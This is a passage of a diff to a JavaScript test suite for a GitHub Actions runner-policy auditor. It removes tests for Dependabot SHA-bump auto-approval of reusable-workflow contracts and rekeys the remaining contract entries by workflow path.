-for (const field of ["main", "pre", "post", "image"]) {
-  test(`Dependabot SHA bump declines a $/ action whose runs.${field} leaves its directory`, async () => {
-    const message = await unchangedBumpDecline({
-      actionSource: `name: scan-setup\nruns:\n  using: node24\n  ${field}: ../other/index.js\n`,
-    });
-    assert.ok(
-      message.includes(`runs.${field} ../other/index.js leaves the action directory`),
-      message,
-    );
-  });
-}
-
-test("Dependabot SHA bump declines a composite $/ action whose steps are not a list", async () => {
-  const message = await unchangedBumpDecline({
-    actionSource: "name: scan-setup\nruns:\n  using: composite\n  steps:\n    run: echo setup\n",
-  });
-  assert.match(message, /composite runs\.steps is not a list/);
-});
-
-test("Dependabot SHA bump declines a job-level $/ nested workflow", async () => {
-  const workflow = REUSABLE_WORKFLOW_LOCAL_NESTED_WORKFLOW_SOURCE.replace(
-    "uses: ./.github/workflows/nested-scan.yml",
-    "uses: $/.github/workflows/nested-scan.yml",
-  );
-  const nestedTree = [
-    { path: ".github/workflows/nested-scan.yml", type: "blob", sha: NESTED_SCAN_BLOB_SHA },
-  ];
-  const message = await unchangedBumpDecline({ workflow, tree: nestedTree });
-  assert.match(
-    message,
-    /job nested uses \$\/\.github\/workflows\/nested-scan\.yml; GitHub documents \$\/ for actions only/,
-  );
-});
-
-for (const [label, githubToken, expected] of [
-  ["sends GITHUB_TOKEN as a bearer token", "test-token", "Bearer test-token"],
-  ["stays unauthenticated without GITHUB_TOKEN", "", undefined],
-]) {
-  test(`commit tree request ${label}`, async () => {
-    const root = await dependabotBumpRepository();
-    const inner = unchangedCommitRelativeFetchImpl();
-    const authorizations = new Map();
-    const findings = await audit(root, {
-      githubToken,
-      fetchImpl: async (url, init) => {
-        authorizations.set(
-          url.startsWith("https://api.github.com/") ? "api" : "raw",
-          init?.headers?.authorization,
-        );
-        return inner(url, init);
-      },
-    });
-    assert.deepEqual(findings, []);
-    assert.equal(authorizations.get("api"), expected);
-    assert.equal(authorizations.get("raw"), undefined);
-  });
-}
-
-// Regression test for a gap where workflow-level `defaults` sat outside
-// every compared surface field. GitHub applies `defaults.run.shell` and
-// `defaults.run.working-directory` to every `run:` step, so a bump editing
-// only `defaults` executes a byte-identical credential-bearing step body
-// under a different interpreter or working directory while the whole
-// recorded surface stays unchanged.
-test("Dependabot SHA bump that changes workflow-level run defaults is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_WORKFLOW_DEFAULTS_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(`auto-approval declined: defaults changed since the previously reviewed .*@${SHA}`),
-  );
-});
-
-// Job-level defaults are the same execution-semantics surface scoped to one
-// job; they are compared as part of that job's execution boundary.
-test("Dependabot SHA bump that changes job-level run defaults is declined with a specific diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_JOB_DEFAULTS_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_JOB_DEFAULTS_CHANGED_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(`auto-approval declined: routing changed since the previously reviewed .*@${SHA}`),
-  );
-});
-
-test("Dependabot SHA bump that resolves run defaults through a needs indirection is declined", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_DEFAULTS_NEEDS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_DEFAULTS_NEEDS_COSMETIC_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
-  );
-});
-
-const NEEDS_MATRIX_CALLER = `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`;
-
-test("Dependabot SHA bump auto-approves a needs-derived matrix that no routing field reads", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: { "ci.yml": NEEDS_MATRIX_CALLER },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_NEEDS_MATRIX_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: withCosmeticStep(REUSABLE_WORKFLOW_NEEDS_MATRIX_SOURCE),
-    }),
-  });
-  assert.deepEqual(findings, []);
-});
-
-for (const [label, from, to] of [
-  [
-    "runs-on reads a matrix value",
-    `    runs-on: \${{ inputs.runner }}`,
-    `    runs-on: \${{ matrix.runner }}`,
-  ],
-  [
-    "runs-on reads the strategy context",
-    `    runs-on: \${{ inputs.runner }}`,
-    `    runs-on: \${{ strategy.job-total > 1 && inputs.runner || 'ubuntu-24.04' }}`,
-  ],
-  [
-    "environment reads a matrix value",
-    "    strategy:",
-    `    environment: \${{ matrix.environment }}\n    strategy:`,
-  ],
-  [
-    "container reads a matrix value",
-    "    strategy:",
-    `    container: \${{ matrix.image }}\n    strategy:`,
-  ],
-  [
-    "run defaults read a job env value taken from the matrix",
-    "    strategy:",
-    `    env:\n      SH: \${{ matrix.shell }}\n    defaults:\n      run:\n        shell: \${{ env.SH }}\n    strategy:`,
-  ],
-]) {
-  test(`Dependabot SHA bump is declined when a needs-derived matrix routes because ${label}`, async () => {
-    const source = REUSABLE_WORKFLOW_NEEDS_MATRIX_SOURCE.replace(from, to);
-    assert.notEqual(source, REUSABLE_WORKFLOW_NEEDS_MATRIX_SOURCE);
-    const root = await repository({
-      visibility: "public",
-      selfHostedCi: false,
-      workflows: { "ci.yml": NEEDS_MATRIX_CALLER },
-    });
-    const findings = await audit(root, {
-      fetchImpl: fetchImplFor({ [SHA]: source, [DEPENDABOT_BUMP_SHA]: withCosmeticStep(source) }),
-    });
-    const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-    assert.ok(contractFinding);
-    assert.match(
-      contractFinding.message,
-      /auto-approval declined: job scan references needs in a routing-relevant field, which cannot be safely diffed for auto-approval/,
-    );
-  });
-}
-
-// Regression test: allowedCallerPermissions is trusted for something the
-// compared auto-approval surface (workflow_call, permissions, routing,
-// credential references) cannot observe -- that the called workflow's steps
-// still use the privileged, potentially self-hosted-reachable grant safely
-// rather than, say, exfiltrating an id-token-derived credential or misusing
-// a pull-requests:write grant. A bumped SHA could keep every compared field
-// identical while its steps do something different with that already-
-// reviewed grant, so auto-approval must decline every allowedCallerPermissions
-// contract even when the structural surface is otherwise unchanged.
-test("Dependabot SHA bump of an allowedCallerPermissions contract is declined regardless of surface match", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    policyOverrides: {
-      approvedReusableWorkflowContracts: {
-        [REUSABLE_REFERENCE]: {
+        [`${REUSABLE_PATH}@${SHA}`]: {
           routing: "runner-input",
           runnerInput: "runner",
           allowedInputs: ["runner"],
           allowedSecrets: {},
-          allowedCallerPermissions: { "pull-requests": "write" },
         },
       },
     },
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
   });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: ${REUSABLE_PATH} carries a reviewed allowedCallerPermissions grant; its steps cannot be proven unchanged by this surface diff, so auto-approval is declined`,
-    ),
+  await assert.rejects(
+    () => audit(root),
+    (error) =>
+      error instanceof ConfigurationError &&
+      error.message.startsWith(`policy.approvedReusableWorkflowContracts.${REUSABLE_PATH}@${SHA}`),
   );
-});
-
-// Regression test: a runner-input contract with a nonempty allowedSecrets
-// mapping lets a statically read-only caller forward those exact reviewed
-// secrets to a workflow executing on a caller-chosen runner. What a bumped
-// SHA's steps do with a forwarded secret sits outside the compared surface,
-// exactly like allowedCallerPermissions, so
-// auto-approval must decline every secret-capable runner-input contract even
-// when the structural surface is otherwise unchanged.
-test("Dependabot SHA bump of a secret-capable runner-input contract is declined regardless of surface match", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    policyOverrides: {
-      approvedReusableWorkflowContracts: {
-        [REUSABLE_REFERENCE]: {
-          routing: "runner-input",
-          runnerInput: "runner",
-          allowedInputs: ["runner"],
-          allowedSecrets: { token: `\${{ secrets.SCANNER_TOKEN }}` },
-        },
-      },
-    },
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-    secrets:
-      token: \${{ secrets.SCANNER_TOKEN }}
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: fetchImplFor({
-      [SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-      [DEPENDABOT_BUMP_SHA]: REUSABLE_WORKFLOW_BASIS_SOURCE,
-    }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(
-    contractFinding.message,
-    new RegExp(
-      `auto-approval declined: ${REUSABLE_PATH} receives reviewed caller secrets on a caller-chosen runner; its steps cannot be proven unchanged by this surface diff, so auto-approval is declined`,
-    ),
-  );
-});
-
-test("auto-approval declines and reports a fetch failure without approving the candidate", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const findings = await audit(root, {
-    fetchImpl: async () => ({ ok: false, status: 500, statusText: "Internal Server Error" }),
-  });
-  const contractFinding = findings.find((finding) => finding.rule === "runner-target-contract");
-  assert.ok(contractFinding);
-  assert.match(contractFinding.message, /auto-approval declined: could not fetch/);
-});
-
-test("disableAutoApproval escape hatch skips fetching and reproduces the unchanged pre-patch diagnostic", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  let fetchCalled = false;
-  const findings = await audit(root, {
-    disableAutoApproval: true,
-    fetchImpl: async () => {
-      fetchCalled = true;
-      throw new Error("fetch must not be called when auto-approval is disabled");
-    },
-  });
-  assert.equal(fetchCalled, false);
-  assert.deepEqual(findings, [
-    {
-      rule: "runner-target-contract",
-      file: ".github/workflows/ci.yml",
-      job: "scan",
-      message: "the reusable workflow path@SHA has no reviewed runner-input contract",
-    },
-  ]);
-});
-
-test("CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL=true disables auto-approval by default", async () => {
-  const root = await repository({
-    visibility: "public",
-    selfHostedCi: false,
-    workflows: {
-      "ci.yml": `jobs:
-  scan:
-    uses: ${DEPENDABOT_BUMP_REFERENCE}
-    with:
-      runner: ubuntu-24.04
-`,
-    },
-  });
-  const priorValue = process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL;
-  process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL = "true";
-  let fetchCalled = false;
-  try {
-    const findings = await audit(root, {
-      fetchImpl: async () => {
-        fetchCalled = true;
-        throw new Error("fetch must not be called when the escape-hatch env var is set");
-      },
-    });
-    assert.equal(fetchCalled, false);
-    assert.equal(
-      findings[0]?.message,
-      "the reusable workflow path@SHA has no reviewed runner-input contract",
-    );
-  } finally {
-    if (priorValue === undefined) {
-      delete process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL;
-    } else {
-      process.env.CI_RUNNER_POLICY_DISABLE_AUTO_APPROVAL = priorValue;
-    }
-  }
 });
 
 test("public opaque reusable call and alternate runner-label input are rejected", async () => {
@@ -6672,7 +3435,7 @@ test("exact reviewed hosted-only reusable workflow needs no runner input", async
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   assert.deepEqual(await audit(root), []);
 });
@@ -6692,7 +3455,7 @@ test("hosted-only reusable contract rejects a caller-added runner input", async 
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   assert.deepEqual(
     (await audit(root)).map(({ rule }) => rule),
@@ -6714,7 +3477,7 @@ test("hosted-only reusable contract rejects inherited caller secrets", async () 
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   const findings = await audit(root);
   assert.equal(findings.length, 1);
@@ -6778,7 +3541,7 @@ test("hosted-only reusable contract accepts its exact reviewed secret mapping", 
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   assert.deepEqual(await audit(root), []);
 });
@@ -6813,7 +3576,7 @@ jobs:
     });
     await writeFile(
       path.join(root, "runner-policy-policy.json"),
-      `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+      `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
     );
     assert.deepEqual(await audit(root), [], skipActors);
   }
@@ -6842,7 +3605,7 @@ jobs:
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   const findings = await audit(root);
   assert.equal(findings.length, 1);
@@ -6869,7 +3632,7 @@ test("reviewed hosted-only reusable secret mappings retain their exact contract"
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   assert.deepEqual(await audit(root), []);
 });
@@ -7449,7 +4212,7 @@ test("hosted-only reusable contract rejects an alternate secret expression", asy
   });
   await writeFile(
     path.join(root, "runner-policy-policy.json"),
-    `${JSON.stringify(HISTORICAL_POLICY, null, 2)}\n`,
+    `${JSON.stringify(HOSTED_ONLY_POLICY, null, 2)}\n`,
   );
   const findings = await audit(root);
   assert.equal(findings.length, 1);
@@ -8419,7 +5182,9 @@ test("a fleet-literal job with non-explicit permissions is still refused", async
 test("a grant keyed to a fleet-literal reusable-call job is inventory drift, not a waiver", async () => {
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: FLEET_LANE_CONTRACT },
+      approvedReusableWorkflowContracts: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: FLEET_LANE_CONTRACT,
+      },
     },
     localRoutingGrants: {
       ".github/workflows/claude-review.yml#review": {
@@ -8452,7 +5217,9 @@ jobs:
 test("a reusable call whose runner input is the fleet review label is admitted under its contract", async () => {
   const root = await repository({
     policyOverrides: {
-      approvedReusableWorkflowContracts: { [FLEET_CLAUDE_REVIEW_REFERENCE]: FLEET_LANE_CONTRACT },
+      approvedReusableWorkflowContracts: {
+        [pathOf(FLEET_CLAUDE_REVIEW_REFERENCE)]: FLEET_LANE_CONTRACT,
+      },
     },
     workflows: {
       "claude-review.yml": `permissions: read-all
@@ -8487,7 +5254,7 @@ const CHECKS_REFERENCE =
   "melodic-software/ci-workflows/.github/workflows/checks.yml@b260ba091ca89bb3292eb53abea07ca8f0a51bf1";
 const CHECKS_CONTRACT = HISTORICAL_CONTRACTS[CHECKS_REFERENCE];
 const CHECKS_POLICY_OVERRIDES = {
-  approvedReusableWorkflowContracts: { [CHECKS_REFERENCE]: CHECKS_CONTRACT },
+  approvedReusableWorkflowContracts: { [pathOf(CHECKS_REFERENCE)]: CHECKS_CONTRACT },
 };
 
 // A refused contract costs the call its routing target too: the fleet label in
@@ -8516,44 +5283,6 @@ jobs:
 ${inputs.map((line) => `      ${line}`).join("\n")}
 `;
 }
-
-test("the shipped checks.yml contract is the reusable's whole declared surface", () => {
-  assertLiveSuccessors(["checks"]);
-  // Pinned so a later narrowing to one caller's subset is a visible diff. The
-  // list is on.workflow_call.inputs at the pinned SHA in declaration order, all
-  // nineteen; the reusable declares no secrets, and its job asks for exactly
-  // the two read scopes the floor names.
-  assert.deepEqual(CHECKS_CONTRACT, {
-    routing: "runner-input",
-    runnerInput: "runner",
-    allowedInputs: [
-      "runner",
-      "filters",
-      "timeout-minutes",
-      "typos",
-      "gitleaks",
-      "editorconfig",
-      "markdown",
-      "shellcheck",
-      "actionlint",
-      "exec-bit",
-      "machine-specific-paths",
-      "eol-renormalize",
-      "comment-hygiene",
-      "lychee-offline",
-      "check-jsonschema",
-      "check-jsonschema-files",
-      "check-jsonschema-builtin-schema",
-      "machine-specific-paths-exclude",
-      "comment-hygiene-exclude",
-    ],
-    allowedSecrets: {},
-    minimumCallerPermissions: {
-      contents: "read",
-      "pull-requests": "read",
-    },
-  });
-});
 
 test("a private fleet caller of the checks reusable at the approved SHA is admitted", async () => {
   const root = await repository({
@@ -8590,25 +5319,17 @@ test("the checks contract admits every input the reusable declares, not one call
   assert.deepEqual(await audit(root), []);
 });
 
-test("the checks reusable at an unapproved SHA is refused", async () => {
-  // The same workflow path already has a reviewed contract, so this is the
-  // Dependabot-bump shape: the checker fetches both revisions and compares
-  // their surface. The suite's hermetic stub declines every fetch, so the
-  // reference falls back to the fail-closed branch and the reason names the
-  // declined auto-approval rather than passing on an unreviewed revision.
+test("the checks reusable at a tag is refused", async () => {
   const root = await repository({
     policyOverrides: CHECKS_POLICY_OVERRIDES,
     workflows: {
       "ci.yml": checksCaller([`runner: ${FLEET_LABEL}`]).replace(
         "checks.yml@b260ba091ca89bb3292eb53abea07ca8f0a51bf1",
-        `checks.yml@${"c".repeat(40)}`,
+        "checks.yml@v1.0.0",
       ),
     },
   });
-  assert.match(
-    await checksContractRefusal(root),
-    /has no reviewed runner-input contract \(auto-approval declined: /u,
-  );
+  assert.match(await checksContractRefusal(root), /ref @v1\.0\.0 is not approved/u);
 });
 
 test("an input the checks reusable does not declare is refused by name", async () => {
@@ -8644,16 +5365,11 @@ test("a checks caller that does not grant the contract's read floor is refused",
 const CHECKS_REFERENCE_WAVE_TAG =
   "melodic-software/ci-workflows/.github/workflows/checks.yml@906ae7ef379ea4d2b8497f64475dce1d3d8715c4";
 
-test("the checks.yml contract at the wave tag copies the first contract forward verbatim", () => {
-  assertLiveSuccessors(["checks"]);
-  assert.deepEqual(HISTORICAL_CONTRACTS[CHECKS_REFERENCE_WAVE_TAG], CHECKS_CONTRACT);
-});
-
 test("a private fleet caller of the checks reusable at the wave tag is admitted", async () => {
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [CHECKS_REFERENCE_WAVE_TAG]: HISTORICAL_CONTRACTS[CHECKS_REFERENCE_WAVE_TAG],
+        [pathOf(CHECKS_REFERENCE_WAVE_TAG)]: HISTORICAL_CONTRACTS[CHECKS_REFERENCE_WAVE_TAG],
       },
     },
     workflows: {
@@ -8837,7 +5553,7 @@ test("every managed target of a claude lane caller admits that caller", async ()
       );
       const root = await consumerCarrying({ body, visibility: "private", selfHostedCi: true });
       assert.deepEqual(
-        await auditRepository({ root, githubRepository: target, fetchImpl: HERMETIC_FETCH_STUB }),
+        await auditRepository({ root, githubRepository: target }),
         [],
         `${source} is managed for ${target} but does not audit clean there`,
       );
@@ -8885,7 +5601,6 @@ test("claude lane caller components pass runner policy for a private self-hosted
       await auditRepository({
         root,
         githubRepository: "melodic-software/medley",
-        fetchImpl: HERMETIC_FETCH_STUB,
       }),
       [],
       `${source} must audit clean for the private self-hosted consumers it is managed for`,
@@ -8904,7 +5619,6 @@ test("a fleet-routed claude lane caller is rejected outright on a public consume
         await auditRepository({
           root,
           githubRepository: "melodic-software/claude-code-plugins",
-          fetchImpl: HERMETIC_FETCH_STUB,
         })
       ).map(({ rule }) => rule),
     );
@@ -8916,49 +5630,12 @@ test("a fleet-routed claude lane caller is rejected outright on a public consume
   assert.ok(asserted > 0, "expected at least one fleet-routed caller audited on a public consumer");
 });
 
-// The ci-perf wave tag. Both lane reusables keep their whole workflow_call
-// declaration, their job permissions, and their runs-on routing across the
-// bump; the only difference is an action pin inside a credential-consuming
-// step, which the credential-references surface records in full and which is
-// therefore why auto-approval declines and these entries are written by hand.
-// Equality against the predecessor is the assertion, so a widened input,
-// secret, or caller permission smuggled into the new key fails here.
-test("both claude lane contracts at the wave tag copy their predecessors forward verbatim", () => {
-  assertLiveSuccessors(["claude-review", "claude-security-review"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  let asserted = 0;
-  for (const lane of ["claude-review", "claude-security-review"]) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${lane}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_17_2}`];
-    assert.ok(previous, `expected a predecessor contract for ${lane}`);
-    assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`], previous);
-    asserted += 1;
-  }
-  assert.equal(asserted, 2);
-});
-
-// The reusable the wave-tag convergence stranded. It is not a claude lane and
-// is not distributed by this repository, so the first 6b-i pull request did
-// not carry it; its caller had to hold its old pin because
-// `reusableWorkflowStatus` fails closed on an unreviewed path@SHA and the
-// Dependabot auto-approval path declines any contract naming
-// `allowedCallerPermissions`, which this one does. The declared surface is
-// unchanged at the tag, so equality against the predecessor is the assertion.
-test("issue-triage-label at the wave tag copies its predecessor forward verbatim", () => {
-  assertLiveSuccessors(["issue-triage-label"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  const workflowPath = "melodic-software/ci-workflows/.github/workflows/issue-triage-label.yml";
-  const previous = contracts[`${workflowPath}@c5e729c0af0e55ffed4675ec85c1b57356fef79e`];
-  assert.ok(previous, "expected a predecessor contract for issue-triage-label");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`], previous);
-});
-
 test("a governed caller of issue-triage-label at the wave tag is admitted", async () => {
   const reference = `melodic-software/ci-workflows/.github/workflows/issue-triage-label.yml@${REPINE_LANE_SHA_V0_22_0}`;
   const root = await repository({
     policyOverrides: {
       approvedReusableWorkflowContracts: {
-        [reference]: HISTORICAL_CONTRACTS[reference],
+        [pathOf(reference)]: HISTORICAL_CONTRACTS[reference],
       },
     },
     workflows: {
@@ -8977,52 +5654,6 @@ jobs:
   assert.deepEqual(await audit(root), []);
 });
 
-// The last two reusables standards' own `ci.yml` still called at pre-tag
-// revisions. `osv-scanner.yml` is byte-identical at the tag, so its terms copy
-// forward; the one addition is the read floor its own `permissions:` block
-// requests, on the pattern the v0.14.2 review used for `do-not-merge-gate`,
-// `semantic-pr` and `pr-issue-linkage`. A called workflow can only narrow the
-// caller's token, so an under-granted caller would otherwise pass policy and
-// fail inside the callee with no repository to read.
-test("osv-scanner at the wave tag copies its predecessor forward and adds only the contents floor", () => {
-  assertLiveSuccessors(["osv-scanner"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  const workflowPath = "melodic-software/ci-workflows/.github/workflows/osv-scanner.yml";
-  const previous = contracts[`${workflowPath}@${GH_FREE_GATE_SHA}`];
-  assert.ok(previous, "expected a predecessor contract for osv-scanner");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`], {
-    ...previous,
-    minimumCallerPermissions: { contents: "read" },
-  });
-});
-
-// `zizmor.yml` is the one contract in this wave that is not a verbatim copy.
-// Its job at the tag declares `security-events: write` unconditionally (the
-// `upload-sarif` step stays gated on the input, but expressions are illegal in
-// a `permissions:` scope), and a called workflow can only narrow the caller's
-// token and never widen it, so every caller has to grant that scope and the
-// contract needs the write-capable waiver to admit it. Everything else copies
-// from `31a5b76c`: routing, runner input, allowed inputs and the empty secret
-// map. `upload-sarif` stays out of `allowedInputs`, as it did at v0.14.2.
-test("zizmor at the wave tag copies its predecessor forward and adds only the reviewed caller-permission waiver", () => {
-  assertLiveSuccessors(["zizmor"]);
-  const contracts = HISTORICAL_CONTRACTS;
-  const workflowPath = "melodic-software/ci-workflows/.github/workflows/zizmor.yml";
-  const previous = contracts[`${workflowPath}@31a5b76c4a0b663023dc1c944e2bcfc01d6f6c46`];
-  assert.ok(previous, "expected a predecessor contract for zizmor");
-  assert.deepEqual(contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`], {
-    ...previous,
-    allowedCallerPermissions: { contents: "read", "security-events": "write" },
-  });
-  // The same waiver was already reviewed at v0.14.2, the last revision whose
-  // zizmor job declared the scope, so the tag's contract restates a reviewed
-  // shape rather than inventing one.
-  assert.deepEqual(
-    contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`],
-    contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_14_2}`],
-  );
-});
-
 test("a governed caller of osv-scanner at the wave tag is admitted only when it clears the contents floor", async () => {
   const reference = `melodic-software/ci-workflows/.github/workflows/osv-scanner.yml@${REPINE_LANE_SHA_V0_22_0}`;
   const workflow = (permissions) => `permissions: read-all
@@ -9036,7 +5667,7 @@ ${permissions}
 `;
   const policyOverrides = {
     approvedReusableWorkflowContracts: {
-      [reference]: HISTORICAL_CONTRACTS[reference],
+      [pathOf(reference)]: HISTORICAL_CONTRACTS[reference],
     },
   };
   const granted = await repository({
@@ -9074,7 +5705,7 @@ ${permissions}
 `;
   const policyOverrides = {
     approvedReusableWorkflowContracts: {
-      [reference]: HISTORICAL_CONTRACTS[reference],
+      [pathOf(reference)]: HISTORICAL_CONTRACTS[reference],
     },
   };
   const granted = await repository({
@@ -9151,24 +5782,6 @@ const WAVE_PATCH_TAG_CALLERS = [
   },
 ];
 
-test("every reusable contract at the wave patch tag copies its v0.22.0 entry forward verbatim", () => {
-  assertLiveSuccessors(WAVE_PATCH_TAG_CALLERS.map(({ reusable }) => reusable));
-  const contracts = HISTORICAL_CONTRACTS;
-  let asserted = 0;
-  for (const { reusable } of WAVE_PATCH_TAG_CALLERS) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_0}`];
-    assert.ok(previous, `expected a v0.22.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_22_1}`],
-      previous,
-      `${reusable} at the patch tag is not a verbatim copy of its v0.22.0 entry`,
-    );
-    asserted += 1;
-  }
-  assert.equal(asserted, 6);
-});
-
 test("a governed caller of each reusable at the wave patch tag is admitted", async () => {
   let asserted = 0;
   for (const { reusable, job, permissions, secrets } of WAVE_PATCH_TAG_CALLERS) {
@@ -9177,7 +5790,7 @@ test("a governed caller of each reusable at the wave patch tag is admitted", asy
     const root = await repository({
       policyOverrides: {
         approvedReusableWorkflowContracts: {
-          [reference]: HISTORICAL_CONTRACTS[reference],
+          [pathOf(reference)]: HISTORICAL_CONTRACTS[reference],
         },
       },
       workflows: {
@@ -9193,32 +5806,6 @@ ${secrets ? `    secrets:\n${block(secrets, "      ")}\n` : ""}`,
       },
     });
     assert.deepEqual(await audit(root), [], `a governed caller of ${reusable} was not admitted`);
-    asserted += 1;
-  }
-  assert.equal(asserted, 6);
-});
-
-// The ci-workflows v0.22.2 patch tag, the revision the whole fleet converges
-// on. `compare/cd2f4e6d...5776760` touches only the `ci-status` composite,
-// `.claude/cloud-bootstrap.sh`, `.github/actionlint.yaml` and ci-workflows'
-// own `ci.yml` and `README.md`, so all of the reusables above are
-// byte-identical at the two revisions, `checks.yml` included this time (its
-// thirteen composite steps did not move again). Every entry is a verbatim copy
-// forward of its v0.22.1 entry, and the v0.22.1 and older entries stay as they
-// were reviewed, because the allowlist is historical.
-test("every reusable contract at the convergence tag copies its v0.22.1 entry forward verbatim", () => {
